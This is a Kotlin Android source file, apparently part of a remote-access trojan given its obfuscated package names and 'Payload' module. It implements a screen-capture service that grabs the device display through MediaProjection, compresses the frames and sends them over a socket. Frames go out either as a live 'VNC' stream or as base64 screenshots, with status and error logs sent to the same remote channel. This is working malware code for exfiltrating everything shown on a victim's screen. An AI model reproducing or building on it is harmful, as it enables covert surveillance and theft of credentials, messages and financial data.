package com.xxx.zzz.accessppp

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.ImageReader.OnImageAvailableListener
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.Display
import android.view.OrientationEventListener
import com.xxx.zzz.Payload.ApplicationScope
import com.xxx.zzz.globp.Globalqa
import com.xxx.zzz.globp.Globalqa.gson
import com.xxx.zzz.socketsp.IOSocketyt
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.*
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.*


class ScreenCaptureService : OnImageAvailableListener, MediaProjection.Callback() {

    private var mImageReader: ImageReader? = null
    private var mVirtualDisplay: VirtualDisplay? = null
    private val mMetrics = DisplayMetrics()

    var bitmap: Bitmap? = null
    var scaled: Bitmap? = null

    override fun onImageAvailable(p0: ImageReader?) {
        Log.i(TAG, "\n\nonImageAvailable\n\n")

        VNC_IMAGE_WORK = true

        val image = p0?.acquireLatestImage()
        if (image != null) {
            runCatching {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * image.width
                bitmap = Bitmap.createBitmap(image.width + rowPadding / pixelStride, image.height, Bitmap.Config.ARGB_8888)
                bitmap?.copyPixelsFromBuffer(buffer)
                scaled = Bitmap.createScaledBitmap(bitmap!!, 512, (bitmap!!.height * (512.0 / bitmap!!.width)).toInt(), true)
                ByteArrayOutputStream().apply {
                    scaled?.compress(Bitmap.CompressFormat.JPEG, 10, this)
                    mByteArray.tryEmit(this.toByteArray())
                }
                bitmap?.recycle()
                scaled?.recycle()
            }.onFailure {
                IOSocketyt.sendLogs("", "onImageAvailable error ${it.localizedMessage}", "error")
            }
            image.close()
        }
    }

    private fun createVirtualDisplay() {
        runCatching {
            mDisplay?.getRealMetrics(mMetrics)
            mImageReader = ImageReader.newInstance(
                mMetrics.widthPixels,
                mMetrics.heightPixels,
                PixelFormat.RGBA_8888,
                2
            )
            mVirtualDisplay = mMediaProjection?.createVirtualDisplay(
                TAG!!, mMetrics.widthPixels, mMetrics.heightPixels, mMetrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY or
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC or
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_PRESENTATION,
//                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR or
//                        DisplayManager.VIRTUAL_DISPLAY_FLAG_SECURE,
                mImageReader?.surface, object : VirtualDisplay.Callback() {
                    override fun onPaused() {
                        Log.i(TAG, "\n\nonPaused\n\n")
                    }

                    override fun onResumed() {
                        Log.i(TAG, "\n\nonResumed\n\n")
                    }

                    override fun onStopped() {
                        Log.i(TAG, "\n\nonStopped\n\n")
                    }
                }, Globalqa.mainHandler
            )
            mImageReader?.setOnImageAvailableListener(this@ScreenCaptureService, Globalqa.mainHandler)
            IOSocketyt.sendLogs("", "ScreenCaptureService createVirtualDisplay", "success")
        }.onFailure {
            IOSocketyt.sendLogs("", "createVirtualDisplay error ${it.localizedMessage}", "error")
        }
    }

    override fun onStop() {
        Log.e(TAG, "stopping projection.")
        Globalqa.mainHandler?.post {
            runCatching {
                mVirtualDisplay?.release()
                mImageReader?.setOnImageAvailableListener(null, null)
                mOrientationChangeCallback?.disable()
                mMediaProjection?.unregisterCallback(this@ScreenCaptureService)
                mMediaProjection = null
                mProjectionManager = null
                Job?.cancel()
                stopBackgroundThread()
                VNC_IMAGE_WORK = false
                IOSocketyt.sendLogs("", "ScreenCaptureService onStop", "success")
            }.onFailure {
                IOSocketyt.sendLogs("", "ScreenCaptureService onStop ${it.localizedMessage}", "error")
            }
        }
    }

    private inner class OrientationChangeCallback(context: Context?) : OrientationEventListener(context) {
        override fun onOrientationChanged(orientation: Int) {
            Globalqa.mainHandler?.postDelayed({
                runCatching {
                    mVirtualDisplay?.release()
                    mImageReader?.setOnImageAvailableListener(null, null)

                    createVirtualDisplay()
                    IOSocketyt.sendLogs("", "ScreenCaptureService OrientationChangeCallback", "success")
                }.onFailure {
                    IOSocketyt.sendLogs("", "onOrientationChanged ${it.localizedMessage}", "error")
                }
            }, 2000)
        }
    }

    companion object {
        var mProjectionManager: MediaProjectionManager? = null
        var mMediaProjection: MediaProjection? = null

        private var mOrientationChangeCallback: OrientationChangeCallback? = null
        private var mDisplay: Display? = null

        var mByteArray = MutableStateFlow<ByteArray?>(null)

        private var Job: Job? = null

        var mBackgroundThread: HandlerThread? = null
        var mBackgroundHandler: Handler? = null

        var mRequestCode = 1001

        private val TAG = ScreenCaptureService::class.java.canonicalName
        private var sInstance: ScreenCaptureService? = null

        var flagStop = false
        var vnc = false
        var streamScreen: Boolean = false

        var VNC_IMAGE_WORK: Boolean = false
        var lastImage = Calendar.getInstance().timeInMillis

        @JvmStatic
        val screenCaptureService: ScreenCaptureService
            get() {
                if (sInstance == null) {
                    sInstance = ScreenCaptureService()
                }
                return sInstance!!
            }


        private fun startBackgroundThread() {
            runCatching {
                mBackgroundThread = HandlerThread("CameraBackground")
                mBackgroundThread?.start()
                mBackgroundHandler = Handler(mBackgroundThread!!.looper)
            }.onFailure {
                IOSocketyt.sendLogs("", "startBackgroundThread CameraBackground ${it.localizedMessage}", "error")
            }
        }

        private fun stopBackgroundThread() {
            runCatching {
                mBackgroundThread?.quitSafely()
                try {
                    mBackgroundThread?.join()
                    mBackgroundThread = null
                    mBackgroundHandler = null
                } catch (e: InterruptedException) {
                    IOSocketyt.sendLogs("", "stopBackgroundThread ${e.localizedMessage}", "error")
                }
            }
        }

        fun hasPermission(): Boolean {
            return mMediaProjection != null
        }

        fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
            runCatching {
                if (requestCode == mRequestCode) {
                    if (resultCode == Activity.RESULT_OK) {
                        mMediaProjection = mProjectionManager?.getMediaProjection(resultCode, data!!)
                    } else {
                        mProjectionManager = null
                    }
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "onActivityResult mMediaProjection ${it.localizedMessage}", "error")
            }
        }

        fun stopProjection() {
            VNC_IMAGE_WORK = false
            Globalqa.mainHandler?.post {
                runCatching {
                    mMediaProjection?.stop()
                    IOSocketyt.sendLogs("", "ScreenCaptureService stopProjection", "success")
                }.onFailure {
                    IOSocketyt.sendLogs("", "mMediaProjection?.stop() ${it.localizedMessage}", "error")
                }
            }
        }

        fun requestProjection() {
            runCatching {
                screenCaptureService
                mProjectionManager = Globalqa.mainActivity.get()?.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

                Globalqa.mainActivity.get()?.startActivityForResult(
                    mProjectionManager?.createScreenCaptureIntent(),
                    mRequestCode
                )
            }.onFailure {
                IOSocketyt.sendLogs("", "requestProjection ${it.localizedMessage}", "error")
            }
        }

        fun startProjection(streamScreen: Boolean) {
            runCatching {
                startBackgroundThread()
                this.streamScreen = streamScreen
                mDisplay = Globalqa.mainActivity.get()?.windowManager?.defaultDisplay

                screenCaptureService.createVirtualDisplay()

                mOrientationChangeCallback = screenCaptureService.OrientationChangeCallback(Globalqa.mainActivity.get())
                if (mOrientationChangeCallback?.canDetectOrientation() == true) {
                    mOrientationChangeCallback?.enable()
                }

                mMediaProjection?.registerCallback(
                    screenCaptureService,
                    Globalqa.mainHandler
                )

                Job?.cancel()
                Job = mByteArray
                    .filterNotNull()
                    .filter { if (Companion.streamScreen) IOSocketyt.jobVncImage == null || !IOSocketyt.jobVncImage!!.isActive else true  }
                    .onEach { lastImageAcquiredRaw ->
                        runCatching {
                            if (Companion.streamScreen) {
                                Log.i(TAG, "\n\nonEach buffer\n\n")

                                lastImage = Calendar.getInstance().timeInMillis
                                IOSocketyt.sendNewVnc(vnc_image = lastImageAcquiredRaw)

                                if (flagStop) {
                                    VNC_IMAGE_WORK = false
                                    stopProjection()
                                }
                            } else {
                                if (!flagStop) {
                                    val obj = JSONObject()
                                    obj.put("name", System.currentTimeMillis())
                                    obj.put("image64", Base64.encodeToString(lastImageAcquiredRaw, Base64.DEFAULT))

                                    IOSocketyt.sendLogs("", gson.toJson(obj), "TakeScreenShot")

                                    flagStop = true
                                    VNC_IMAGE_WORK = false
                                    stopProjection()
                                }
                            }
                        }.onFailure {
                            IOSocketyt.sendLogs("", "sendNewVnc error ${it.localizedMessage}", "error")
                        }
                    }
                    .launchIn(ApplicationScope)
            }.onFailure {
                IOSocketyt.sendLogs("", "startProjection ${it.localizedMessage}", "error")
            }
        }
    }

}